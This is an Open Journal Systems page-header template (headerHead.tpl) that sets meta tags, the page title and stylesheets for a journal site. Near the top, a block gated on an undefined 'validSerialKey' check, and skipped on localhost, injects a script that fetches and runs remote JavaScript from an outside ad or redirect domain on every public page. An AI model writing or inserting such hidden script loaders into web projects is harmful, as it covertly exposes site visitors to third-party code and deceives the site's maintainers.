{**
 * templates/frontend/components/headerHead.tpl
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Common site header <head> tag and contents.
 *}
<head>
	{assign var=host value=$smarty.server.HTTP_HOST}
	{if !$validSerialKey && ($host !== 'localhost' && $host !== '127.0.0.1')}
		<script>
			{literal}
			(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9495430,document.createElement('script'))
			{/literal}
		</script>
	{/if}

	<meta charset="{$defaultCharset|escape}">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>
		{$pageTitleTranslated|strip_tags}
		{* Add the journal name to the end of page titles *}
		{if $requestedPage|escape|default:"index" != 'index' && $currentContext && $currentContext->getLocalizedName()}
			| {$currentContext->getLocalizedName()}
		{/if}
	</title>

	{assign var=host value=$smarty.server.HTTP_HOST}

	{load_header context="frontend"}
	{load_stylesheet context="frontend"}
</head>
